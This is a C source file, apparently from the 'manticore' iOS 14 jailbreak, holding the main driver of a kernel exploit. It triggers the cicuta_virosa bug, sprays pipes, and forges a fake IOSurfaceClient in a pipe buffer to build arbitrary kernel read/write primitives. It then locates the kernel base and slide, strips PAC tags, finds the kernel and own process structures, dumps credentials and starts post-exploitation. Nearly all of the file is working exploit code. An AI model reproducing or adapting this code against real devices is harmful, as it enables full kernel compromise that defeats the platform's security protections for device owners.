//
//  exploit_main.c
//  manticore
//
//  Created by Luca on 25.02.21.
//

#include <exploit/cicuta/exploit_main.h>
#include <lib/tq/tq_common_p.h>
#include <lib/tq/k_offsets.h>
#include <lib/tq/utils.h>
#include <lib/tq/kapi.h>
#include <lib/tq/k_utils.h>
#include <lib/tq/user_kernel_alloc.h>
#include <lib/tq/iosurface.h>
#include "utils.h"
#include <manticore/jailbreak.h>
#include <exploit/cicuta/cicuta_virosa.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <sys/time.h>


void write_pipe() {
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

static void read_pipe() {
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

void build_stage0_kmem_api(void) {
    stage0_read32 = ^uint32_t (kptr_t addr) {
        uint32_t v = read_32(addr);
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = read_64(addr);
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read64(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
            pos += 8;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        stage0_write(addr, &v, sizeof(v));
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint8_t v[20];
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 20;
            if (bytes > len - pos) {
                bytes = len - pos;
                read_20(addr + pos, v);
            }
            memcpy(v, _data + pos, bytes);
            write_20(addr + pos, v);
            pos += 20;
        }
    };
}

void build_stable_kmem_api(void) {
    static kptr_t pipe_base;
       kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
       kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
       kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
       kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
       kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
       pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

       // XXX dirty hack, but I'm lucky :)
       uint8_t bytes[20];
       read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
       *(kptr_t *)(bytes + 4) = pipe_base;
       write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);

       // iOS 14.x only
       struct fake_client {
           kptr_t pad_00; // can not use IOSurface 0 now
           kptr_t uc_obj;
           uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
           kptr_t surf_obj;
           uint8_t pad_58[0x360 - 0x58];
           kptr_t shared_RW;
       };

       stage0_read32 = ^uint32_t (kptr_t addr) {
           struct fake_client *p = (void *)pipe_buffer;
           p->uc_obj = pipe_base + 16;
           p->surf_obj = addr - 0xb4;
           write_pipe();
           uint32_t v = iosurface_s_get_ycbcrmatrix();
           read_pipe();
           return v;
       };

       stage0_read64 = ^uint64_t (kptr_t addr) {
           uint64_t v = stage0_read32(addr);
           v |= (uint64_t)stage0_read32(addr + 4) << 32;
           return v;
       };

       stage0_read_kptr = ^kptr_t (kptr_t addr) {
           uint64_t v = stage0_read64(addr);
           if (v && (v >> 39) != 0x1ffffff) {
               if (g_exp.debug) {
                   util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
               }
               v |= 0xffffff8000000000; // untag, 25 bits
           }
           return (kptr_t)v;
       };

       stage0_read = ^void (kptr_t addr, void *data, size_t len) {
           uint8_t *_data = data;
           uint32_t v;
           size_t pos = 0;
           while (pos < len) {
               v = stage0_read32(addr + pos);
               memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
               pos += 4;
           }
       };

       stage0_write64 = ^void (kptr_t addr, uint64_t v) {
           struct fake_client *p = (void *)pipe_buffer;
           p->uc_obj = pipe_base + 0x10;
           p->surf_obj = pipe_base;
           p->shared_RW = addr;
           write_pipe();
           iosurface_s_set_indexed_timestamp(v);
           read_pipe();
       };

       stage0_write = ^void (kptr_t addr, void *data, size_t len) {
           uint8_t *_data = data;
           uint64_t v;
           size_t pos = 0;
           while (pos < len) {
               size_t bytes = 8;
               if (bytes > len - pos) {
                   bytes = len - pos;
                   v = stage0_read64(addr + pos);
               }
               memcpy(&v, _data + pos, bytes);
               stage0_write64(addr + pos, v);
               pos += 8;
           }
       };
}


void exploit_main(void){
    sys_init();
    kernel_offsets_init();
    g_exp.debug = true;
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    printf("surface_id %u\n", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();
    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);

    // open the door to iOS 14
    cicuta_virosa();
    gettimeofday(&tv2, NULL);
    uint64_t cost = (tv2.tv_sec - tv1.tv_sec) * 1000 * 1000 + tv2.tv_usec - tv1.tv_usec;
    printf("Exploitation took %.3f seconds\n", cost / 1000000.0);
    build_stage0_kmem_api();

    util_info("self_task 0x%llx, self_pid %d", g_exp.self_task, look_for_proc_basename("manticore"));
    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));

    IOSurfaceRoot_uc = port_name_to_kobject(IOSurfaceRootUserClient);
    kptr_t surfaceClients = kapi_read_kptr(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    kptr_t IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);
  
    build_stable_kmem_api();
    
    
    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }


    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_2; // OSObject::release
    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_2 = kapi_read_kptr(IOSurfaceClient_vt + 2 * sizeof(kptr_t));

    util_info("vt %#llx, vt[2] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_2);

    // device&OS dependent
    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
    uint32_t data[4];
    kptr_t kernel_base = IOSurfaceClient_vt_2; // located in __TEXT_EXEC
    kernel_base &= ~(g_exp.pagesize - 1);
    while (1) {
        kapi_read(kernel_base, data, sizeof(mach_header));
        data[2] = mach_header[2]; // ignore CPU subtype
        if (!memcmp(mach_header, data, sizeof(mach_header))) {
            break; // found
        }
        kernel_base -= g_exp.pagesize;
    }
    g_exp.kernel_base = kernel_base;
    g_exp.kernel_slide = kernel_base - kc_kernel_base;
    util_info("kernel base %#llx, slide %#llx", g_exp.kernel_base, g_exp.kernel_slide);
    g_exp.kernel_proc = kproc_find_pid0(g_exp.self_proc);
    g_exp.kernel_task = kapi_read_kptr(g_exp.kernel_proc + OFFSET(proc, task));
    util_info("kernel_proc %#llx, kernel_task %#llx", g_exp.kernel_proc, g_exp.kernel_task);
    
    g_exp.kernel_map = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, map));
    util_info("kernel_map %#llx", g_exp.kernel_map);

    g_exp.self_proc = kproc_find_by_pid(getpid());
    util_info("self_proc %#llx", g_exp.self_proc);
    util_msleep(100);
    
    // wish me luck!
    g_exp.self_task = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, task));
    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    util_info("self_task %#llx, self_ipc_space %#llx", g_exp.self_task, g_exp.self_ipc_space);
    
    g_exp.kernel_base = kernel_base;
    util_msleep(300);
    g_exp.kernel_proc = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, bsd_info));
    util_msleep(300);
    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    printf("\n* ----- Starting post exploitation stage... ----- *\n");
    
    jailbreak();
}
